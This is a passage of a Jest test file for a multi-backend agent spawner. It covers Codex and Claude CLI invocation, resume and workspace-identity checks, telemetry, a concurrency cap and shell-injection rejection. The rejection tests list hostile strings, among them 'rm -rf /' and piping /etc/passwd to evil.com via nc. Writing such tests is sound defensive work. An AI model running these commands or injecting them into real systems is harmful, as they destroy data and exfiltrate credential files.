      env: { ANTHROPIC_API_KEY: 'sk-test' },
    });

    const spawnCall = cpSpawn.mock.calls[0];
    expect(spawnCall[2].env.ANTHROPIC_API_KEY).toBe('sk-test');
  });
});

describe('spawn — codex backend', () => {
  test('spawns codex exec and returns the captured final message', async () => {
    const spawner = createSpawner();
    const codexWorkdir = process.cwd();
    mockChildProcess.stdout.on.mockImplementation(() => {});
    mockChildProcess.stderr.on.mockImplementation(() => {});
    mockChildProcess.on.mockImplementation((event, cb) => {
      if (event === 'close') {
        const args = cpSpawn.mock.calls[0][1];
        const outputPath = args[args.indexOf('--output-last-message') + 1];
        mkdirSync(dirname(outputPath), { recursive: true });
        writeFileSync(outputPath, 'Codex clean output');
        Promise.resolve().then(() => cb(0));
      }
    });

    const result = await spawner.spawn({
      backend: 'codex',
      task: 'Say exactly: Codex clean output',
      workdir: codexWorkdir,
    });

    expect(result.status).toBe('completed');
    expect(result.output).toBe('Codex clean output');
    expect(result.model).toBe('gpt-5.4-mini');
    expect(cpSpawn).toHaveBeenCalledWith(
      'codex',
      expect.arrayContaining([
        'exec',
        '--skip-git-repo-check',
        '--approve-for-me',
        '-C', codexWorkdir,
        '--model', 'gpt-5.4-mini',
        '--json',
        'Say exactly: Codex clean output',
      ]),
      expect.objectContaining({
        cwd: codexWorkdir,
      })
    );
    expect(cpSpawn.mock.calls[0][1]).not.toContain('--sandbox');
    // No spec.timeout was given, so no hidden wall clock should be applied.
    expect(cpSpawn.mock.calls[0][2]).not.toHaveProperty('timeout');
  });

  test('uses codex exec resume without unsupported spawn-only sandbox or cwd flags', async () => {
    const spawner = createSpawner();
    resolveChildProcess(0, 'Codex resumed output');
    const sessionId = '22222222-2222-4222-8222-222222222222';

    const result = await spawner.spawn({
      backend: 'codex',
      task: 'Continue this Codex session',
      workdir: TEST_WORKSPACE_IDENTITY.canonicalPath,
      nativeResume: { adapterFamily: 'codex-cli', sessionId, workspaceIdentity: TEST_WORKSPACE_IDENTITY },
    });

    const args = cpSpawn.mock.calls[0][1];
    expect(args.slice(0, 3)).toEqual(['exec', '--approve-for-me', 'resume']);
    expect(args).toEqual(expect.arrayContaining([sessionId, 'Continue this Codex session']));
    expect(args).not.toContain('--full-auto');
    expect(args).not.toContain('--sandbox');
    expect(args).not.toContain('-C');
    expect(cpSpawn.mock.calls[0][2].cwd).toBe(TEST_WORKSPACE_IDENTITY.canonicalPath);
    expect(result.harnessSessionId).toBe(sessionId);
  });

  test('blocks option-shaped native session ids before starting a child', async () => {
    const spawner = createSpawner();

    const result = await spawner.spawn({
      backend: 'codex',
      task: 'Do not run',
      nativeResume: { adapterFamily: 'codex-cli', sessionId: '--last' },
    });

    expect(result.status).toBe('failed');
    expect(result.error).toMatch(/canonical UUID/);
    expect(cpSpawn).not.toHaveBeenCalled();
  });

  test('rechecks the witnessed workspace inode after coordination and before child launch', async () => {
    const root = mkdtempSync(join(tmpdir(), 'pd-native-workspace-swap-'));
    const workspace = join(root, 'workspace');
    const movedWorkspace = join(root, 'moved-workspace');
    mkdirSync(workspace);
    const workspaceIdentity = captureWorkspaceIdentity(workspace);
    if (!workspaceIdentity) throw new Error('workspace identity unavailable');
    const sessionId = '33333333-3333-4333-8333-333333333333';
    let swapped = false;
    mockFetch.mockImplementation(async () => {
      if (!swapped) {
        renameSync(workspace, movedWorkspace);
        mkdirSync(workspace);
        swapped = true;
      }
      return {
        ok: true,
        status: 200,
        json: async () => ({ success: true }),
        text: async () => 'OK',
      };
    });

    try {
      const spawner = createSpawner();
      const result = await spawner.spawn({
        backend: 'claude-cli',
        task: 'Do not run in a replaced workspace.',
        workdir: workspaceIdentity.canonicalPath,
        nativeResume: {
          adapterFamily: 'claude-code',
          sessionId,
          workspaceIdentity,
        },
      });

      expect(result.status).toBe('failed');
      expect(result.error).toMatch(/workspace identity changed before child launch/);
      expect(cpSpawn).not.toHaveBeenCalled();
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  test('rechecks a handoff workspace inode at the child-launch boundary', async () => {
    const root = mkdtempSync(join(tmpdir(), 'pd-handoff-workspace-swap-'));
    const workspace = join(root, 'workspace');
    const movedWorkspace = join(root, 'moved-workspace');
    mkdirSync(workspace);
    const workspaceIdentity = captureWorkspaceIdentity(workspace);
    if (!workspaceIdentity) throw new Error('workspace identity unavailable');
    let swapped = false;
    mockFetch.mockImplementation(async () => {
      if (!swapped) {
        renameSync(workspace, movedWorkspace);
        mkdirSync(workspace);
        swapped = true;
      }
      return {
        ok: true,
        status: 200,
        json: async () => ({ success: true }),
        text: async () => 'OK',
      };
    });

    try {
      const spawner = createSpawner();
      const result = await spawner.spawn({
        backend: 'codex',
        task: 'Do not run a successor in a replaced workspace.',
        workdir: workspaceIdentity.canonicalPath,
        workspaceIdentity,
      });

      expect(result.status).toBe('failed');
      expect(result.error).toMatch(/workspace identity changed before child launch/);
      expect(cpSpawn).not.toHaveBeenCalled();
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  test('blocks cross-family and non-session native resume before starting a child', async () => {
    const spawner = createSpawner();

    const crossFamily = await spawner.spawn({
      backend: 'codex',
      task: 'Do not run',
      nativeResume: { adapterFamily: 'claude-code', sessionId: 'claude-session-42' },
    });
    const stateless = await spawner.spawn({
      backend: 'openai',
      task: 'Do not run',
      nativeResume: { adapterFamily: 'openai-api', sessionId: 'provider-call-42' },
    });

    expect(crossFamily.status).toBe('failed');
    expect(crossFamily.error).toMatch(/cannot resume through effective adapter codex-cli/);
    expect(stateless.status).toBe('failed');
    expect(stateless.error).toMatch(/does not preserve native session identity/);
    expect(cpSpawn).not.toHaveBeenCalled();
  });

  test('does not pass ambient Codex thread context into daemon-spawned codex exec', async () => {
    const originalThreadId = process.env.CODEX_THREAD_ID;
    process.env.CODEX_THREAD_ID = 'stale-thread-from-parent';
    try {
      const spawner = createSpawner();
      resolveChildProcess(0, 'Codex clean output');

      await spawner.spawn({
        backend: 'codex',
        task: 'Say exactly: Codex clean output',
      });

      const options = cpSpawn.mock.calls[0][2];
      expect(options.env.CODEX_THREAD_ID).toBeUndefined();
      expect(options.env.OTEL_SDK_DISABLED).toBe('true');
    } finally {
      if (originalThreadId === undefined) delete process.env.CODEX_THREAD_ID;
      else process.env.CODEX_THREAD_ID = originalThreadId;
    }
  });

  test('surfaces structured codex --json errors ahead of noisy stderr', async () => {
    const spawner = createSpawner();
    mockChildProcess.stdout.on.mockImplementation((event, cb) => {
      if (event === 'data') {
        cb(Buffer.from([
          '{"type":"thread.started","thread_id":"thread-test"}',
          '{"type":"error","message":"You have hit your usage limit."}',
          '{"type":"turn.failed","error":{"message":"You have hit your usage limit."}}',
        ].join('\n')));
      }
    });
    mockChildProcess.stderr.on.mockImplementation((event, cb) => {
      if (event === 'data') cb(Buffer.from('failed to load skill noisy warning'));
    });
    mockChildProcess.on.mockImplementation((event, cb) => {
      if (event === 'close') Promise.resolve().then(() => cb(1));
    });

    const result = await spawner.spawn({
      backend: 'codex',
      task: 'test usage limit',
    });

    expect(result.status).toBe('failed');
    expect(result.error).toBe('Codex CLI failed: You have hit your usage limit.');
  });

  test('parses codex --json usage and persists exact telemetry under enforcement', async () => {
    const costTracker = {
      computeCost: jest.fn(() => ({ costUsd: 0.0138, isEstimate: false })),
      record: jest.fn((opts) => ({
        id: 'evt-codex-json',
        ts: 1,
        backend: opts.backend,
        model: opts.model,
        projectName: opts.projectName ?? null,
        projectDir: opts.projectDir ?? null,
        identity: opts.identity ?? null,
        spawnId: opts.spawnId ?? null,
        inputTokens: opts.inputTokens ?? null,
        cachedInputTokens: opts.cachedInputTokens ?? null,
        outputTokens: opts.outputTokens ?? null,
        costUsd: 0.0138,
        isEstimate: false,
      })),
    };
    const spawner = createSpawnerBase({
      costTracker,
      enforceTelemetryPolicy: true,
      enforceTranscriptPolicy: false,
    });

    mockChildProcess.stdout.on.mockImplementation((event, cb) => {
      if (event === 'data') {
        cb(Buffer.from([
          '{"type":"thread.started","thread_id":"thread-test"}',
          '{"type":"turn.completed","usage":{"input_tokens":10000,"cached_input_tokens":4000,"output_tokens":2000}}',
        ].join('\n')));
      }
    });
    mockChildProcess.stderr.on.mockImplementation(() => {});
    mockChildProcess.on.mockImplementation((event, cb) => {
      if (event === 'close') {
        const args = cpSpawn.mock.calls[0][1];
        const outputPath = args[args.indexOf('--output-last-message') + 1];
        mkdirSync(dirname(outputPath), { recursive: true });
        writeFileSync(outputPath, 'Codex clean output');
        Promise.resolve().then(() => cb(0));
      }
    });

    const result = await spawner.spawn({
      backend: 'codex',
      task: 'Say exactly: Codex clean output',
      identity: 'port-daddy:fleet:cartographer',
      workdir: process.cwd(),
    });

    expect(result.status).toBe('completed');
    expect(result.output).toBe('Codex clean output');
    expect(result.telemetry).toEqual({
      inputTokens: 10000,
      cachedInputTokens: 4000,
      outputTokens: 2000,
      costUsd: 0.0138,
      rateMode: 'exact',
    });
    expect(costTracker.computeCost).toHaveBeenCalledWith(
      'codex',
      'gpt-5.4-mini',
      10000,
      2000,
      4000,
    );
    expect(costTracker.record).toHaveBeenCalledWith(expect.objectContaining({
      backend: 'codex',
      model: 'gpt-5.4-mini',
      projectName: 'port-daddy',
      identity: 'port-daddy:fleet:cartographer',
      inputTokens: 10000,
      cachedInputTokens: 4000,
      outputTokens: 2000,
    }));
  });

  test('reports codex child timeout before telemetry enforcement', async () => {
    jest.useFakeTimers();
    const costTracker = {
      computeCost: jest.fn(),
      record: jest.fn(),
    };
    const spawner = createSpawnerBase({
      costTracker,
      enforceTelemetryPolicy: true,
      enforceTranscriptPolicy: false,
    });

    let closeHandler;
    mockChildProcess.stdout.on.mockImplementation((event, cb) => {
      if (event === 'data') {
        cb(Buffer.from('{"type":"thread.started","thread_id":"thread-test"}\n'));
      }
    });
    mockChildProcess.stderr.on.mockImplementation(() => {});
    mockChildProcess.on.mockImplementation((event, cb) => {
      if (event === 'close') {
        closeHandler = cb;
      }
    });

    const promise = spawner.spawn({
      backend: 'codex',
      task: 'Slow Cartographer run',
      timeout: 1000,
    });

    await Promise.resolve();
    await Promise.resolve();
    await jest.advanceTimersByTimeAsync(1000);
    expect(mockChildProcess.kill).toHaveBeenCalledWith('SIGTERM');
    closeHandler(0);

    const result = await promise;
    expect(result.status).toBe('failed');
    expect(result.error).toContain('codex timed out after 1000ms');
    expect(result.error).not.toContain('did not return token counts');
    expect(costTracker.computeCost).not.toHaveBeenCalled();
    jest.useRealTimers();
  });
});

// =============================================================================
// spawn — default models
// =============================================================================

describe('spawn — default models', () => {
  test('ollama defaults to llama3.1:8b', async () => {
    const spawner = createSpawner();
    setupOllamaFetchMock('ok');

    const result = await spawner.spawn({ backend: 'ollama', task: 'test' });
    expect(result.model).toBe('llama3.1:8b');
  });

  test('custom defaults to "custom"', async () => {
    const spawner = createSpawner();
    resolveChildProcess(0, 'ok');

    const result = await spawner.spawn({ backend: 'custom', task: 'echo test' });
    expect(result.model).toBe('custom');
  });

  test('aider defaults to "aider"', async () => {
    const spawner = createSpawner();
    resolveChildProcess(0, 'ok');

    const result = await spawner.spawn({ backend: 'aider', task: 'fix bug' });
    expect(result.model).toBe('aider');
  });
});

// =============================================================================
// aider backend — edge cases
// =============================================================================

describe('aider backend — edge cases', () => {
  test('handles non-zero exit code', async () => {
    const spawner = createSpawner();
    resolveChildProcess(1, 'partial output', 'error details');

    const result = await spawner.spawn({
      backend: 'aider',
      task: 'bad task',
    });

    expect(result.status).toBe('failed');
    expect(result.error).toContain('error details');
  });

  test('handles spawn error (aider not installed)', async () => {
    const spawner = createSpawner();
    rejectChildProcess('spawn aider ENOENT');

    const result = await spawner.spawn({
      backend: 'aider',
      task: 'test',
    });

    expect(result.status).toBe('failed');
    expect(result.error).toContain('Failed to start aider');
  });

  test('uses custom timeout', async () => {
    const spawner = createSpawner();
    resolveChildProcess(0, 'ok');

    await spawner.spawn({
      backend: 'aider',
      task: 'test',
      timeout: 60000,
    });

    const spawnCall = cpSpawn.mock.calls[0];
    expect(spawnCall[2].timeout).toBe(60000);
  });
});

// =============================================================================
// MAX_CONCURRENT_RUNNING — global spawn ceiling (added in 0df9155)
// =============================================================================

describe('spawn — MAX_CONCURRENT_RUNNING ceiling', () => {
  /** Fill spawner to the 20-agent ceiling; returns { spawner, teardown } */
  async function fillToCapacity() {
    const spawner = createSpawner();
    mockChildProcess.stdout.on.mockImplementation(() => {});
    mockChildProcess.stderr.on.mockImplementation(() => {});
    mockChildProcess.on.mockImplementation(() => {});

    const promises = [];
    for (let i = 0; i < 20; i++) {
      promises.push(spawner.spawn({ backend: 'custom', task: `task ${i}` }));
    }
    await new Promise(r => setTimeout(r, 20));

    async function teardown() {
      for (const agent of spawner.list()) spawner.kill(agent.agentId);
      const closeHandlers = mockChildProcess.on.mock.calls.filter(([e]) => e === 'close');
      for (const [, cb] of closeHandlers) cb(null);
      await Promise.allSettled(promises);
    }
    return { spawner, teardown };
  }

  test('blocks spawn when 20 agents are already running', async () => {
    const { spawner, teardown } = await fillToCapacity();

    expect(spawner.list().filter(a => a.status === 'running').length).toBe(20);

    const blocked = await spawner.spawn({ backend: 'custom', task: 'one too many' });
    expect(blocked.status).toBe('failed');
    expect(blocked.error).toContain('Spawn blocked');
    expect(blocked.error).toContain('20');
    expect(blocked.error).toContain('limit');

    await teardown();
  });

  test('blocked spawn returns agentId "blocked" — non-unique sentinel', async () => {
    const { spawner, teardown } = await fillToCapacity();

    // Two blocked spawns get the SAME agentId — documenting the collision bug
    const blocked1 = await spawner.spawn({ backend: 'custom', task: 'blocked A' });
    const blocked2 = await spawner.spawn({ backend: 'custom', task: 'blocked B' });
    expect(blocked1.agentId).toBe('blocked');
    expect(blocked2.agentId).toBe('blocked');
    // BUG: these are indistinguishable. Should be unique or null.
    expect(blocked1.agentId).toBe(blocked2.agentId);

    await teardown();
  });

  test('blocked spawn is not registered in agent list', async () => {
    const { spawner, teardown } = await fillToCapacity();

    await spawner.spawn({ backend: 'custom', task: 'blocked' });
    expect(spawner.list().length).toBe(20);

    await teardown();
  });

  test('blocked spawn does not call PD coordination endpoints', async () => {
    const { spawner, teardown } = await fillToCapacity();

    mockFetch.mockClear();
    await spawner.spawn({ backend: 'custom', task: 'blocked without coordination' });

    expect(mockFetch).not.toHaveBeenCalled();

    await teardown();
  });

  test('blocked response preserves the requested backend and model', async () => {
    const { spawner, teardown } = await fillToCapacity();

    const blocked = await spawner.spawn({
      backend: 'ollama',
      model: 'qwen2.5-coder:14b',
      task: 'overflow',
    });

    expect(blocked.backend).toBe('ollama');
    expect(blocked.model).toBe('qwen2.5-coder:14b');
    expect(blocked.output).toBeNull();
    expect(blocked.startedAt).toBeTruthy();
    expect(blocked.completedAt).toBeTruthy();

    await teardown();
  });

  test('spawn succeeds again after a running agent completes', async () => {
    const spawner = createSpawner();
    setupOllamaFetchMock('ok');

    // Spawn and complete 20 agents (ollama resolves immediately)
    for (let i = 0; i < 20; i++) {
      await spawner.spawn({ backend: 'ollama', task: `task ${i}` });
    }

    // All 20 are completed, not running — ceiling should not block
    const running = spawner.list().filter(a => a.status === 'running');
    expect(running.length).toBe(0);

    // 21st spawn should succeed (completed agents don't count)
    const result = await spawner.spawn({ backend: 'ollama', task: 'after ceiling' });
    expect(result.status).toBe('completed');
    expect(result.agentId).toMatch(/^spawned-/);
  });
});

// =============================================================================
// runChild behavioral regression — stderr appended to output on success
// =============================================================================

describe('runChild — stderr handling on success', () => {
  test('claude-cli success output now includes stderr (behavioral change from 0df9155)', async () => {
    const spawner = createSpawner();

    // Simulate: stdout has actual output, stderr has diagnostic info
    mockChildProcess.stdout.on.mockImplementation((event, cb) => {
      if (event === 'data') cb(Buffer.from('actual output'));
    });
    mockChildProcess.stderr.on.mockImplementation((event, cb) => {
      if (event === 'data') cb(Buffer.from('progress: loading model...'));
    });
    mockChildProcess.on.mockImplementation((event, cb) => {
      if (event === 'close') Promise.resolve().then(() => cb(0));
    });

    const result = await spawner.spawn({
      backend: 'claude-cli',
      task: 'test',
    });

    expect(result.status).toBe('completed');
    // BUG: Before 0df9155, claude-cli only returned stdout on success.
    // After refactor to runChild, stderr is appended with '\nstderr: ' prefix.
    // This pollutes output with diagnostic noise from the claude CLI.
    expect(result.output).toContain('stderr: progress: loading model...');
  });

  test('custom backend stderr-on-success is consistent (was already present before)', async () => {
    const spawner = createSpawner();

    mockChildProcess.stdout.on.mockImplementation((event, cb) => {
      if (event === 'data') cb(Buffer.from('output'));
    });
    mockChildProcess.stderr.on.mockImplementation((event, cb) => {
      if (event === 'data') cb(Buffer.from('warning: something'));
    });
    mockChildProcess.on.mockImplementation((event, cb) => {
      if (event === 'close') Promise.resolve().then(() => cb(0));
    });

    const result = await spawner.spawn({
      backend: 'custom',
      task: 'echo hi',
    });

    expect(result.status).toBe('completed');
    // For custom/aider, this was already the behavior before the refactor
    expect(result.output).toContain('stderr: warning: something');
  });
});

// =============================================================================
// custom backend — shell injection rejection (MISSING NEGATIVE PATH)
// =============================================================================

describe('custom backend — shell metacharacter rejection', () => {
  const DANGEROUS_INPUTS = [
    { input: 'echo; rm -rf /', char: ';' },
    { input: 'cat /etc/passwd | nc evil.com 1234', char: '|' },
    { input: 'echo `whoami`', char: '`' },
    { input: 'echo $(id)', char: '$' },
    { input: 'echo foo && echo bar', char: '&' },
    { input: 'echo foo > /tmp/pwned', char: '>' },
    { input: 'echo foo < /etc/shadow', char: '<' },
    { input: 'echo\nrm -rf /', char: '\\n' },
    { input: 'echo\x00evil', char: 'null byte' },
  ];

  for (const { input, char } of DANGEROUS_INPUTS) {
    test(`rejects task containing ${char}`, async () => {
      const spawner = createSpawner();

      const result = await spawner.spawn({
        backend: 'custom',
        task: input,
      });

      expect(result.status).toBe('failed');
      expect(result.error).toContain('shell metacharacters');
      // Must NOT have spawned a child process
      expect(cpSpawn).not.toHaveBeenCalledWith('/bin/sh', expect.anything(), expect.anything());
    });
  }

  test('allows safe commands without metacharacters', async () => {
    const spawner = createSpawner();
    resolveChildProcess(0, 'safe output');

    const result = await spawner.spawn({
      backend: 'custom',
      task: 'python3 script.py --flag value',
    });

    expect(result.status).toBe('completed');
    expect(cpSpawn).toHaveBeenCalledWith(
      '/bin/sh',
      ['-c', 'python3 script.py --flag value'],
      expect.anything()
    );
  });
});
